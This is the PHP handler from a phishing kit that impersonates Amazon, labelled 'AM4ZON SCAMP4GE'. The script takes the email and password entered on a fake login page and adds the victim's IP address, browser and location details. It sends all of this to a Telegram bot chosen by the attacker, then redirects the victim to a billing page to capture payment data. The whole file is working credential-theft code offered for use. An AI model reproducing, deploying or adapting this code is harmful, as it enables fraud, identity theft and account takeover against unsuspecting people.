<?php
/*
      PRIV8 AM4ZON SCAMP4GE BY XFORGEX CODER

*/
// Start the session
session_start();
error_reporting(0);

# Adding Settings
include('function.php');
$settings = include('../config.php');
# User Agent 

$useragent = $_SERVER['HTTP_USER_AGENT'];

#
$username = $_POST['email']; #id_userLoginId
$password = $_POST['password']; #id_password
#$username = $_SESSION["email"];
#$password = $_SESSION["ap_password"];
# Logs
$message .= "🔥 AM4ZON LOGIN FROM - {$IP} 🔥\n\n";
$message .= "➤ [ Login ]    : {$username}\n";
$message .= "➤ [ Password ] : {$password}\n";
$message .= "--------- MORE INFO -----------\n";
$message .= "➤ [ IP Address ] : {$IP}\n";
$message .= "➤ [ User-Agent ] : {$useragent}\n";
$message .= "➤ [ OS ]         : {$os}\n";
$message .= "➤ [ Browser ]    : {$browser}\n";
$message .= "➤ [ City(IP) ]   : {$city}\n";
$message .= "➤ [ Country ]    : {$countryname}\n";
$message .= "➤ [ Date ]       : {$date}\n";
$message .= "+=+=+=+=+=+=+=+=++=+=+=+=+=+=+=+=+\n";


# Send Bot

if ($settings['telegram'] == "1"){
  $data = $message;
  $send = ['chat_id'=>$settings['chat_id'],'text'=>$data];
  $website = "https://api.telegram.org/{$settings['bot_url']}";
  $ch = curl_init($website . '/sendMessage');
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $result = curl_exec($ch);
  curl_close($ch);
}

header('Location: billing.php')

?>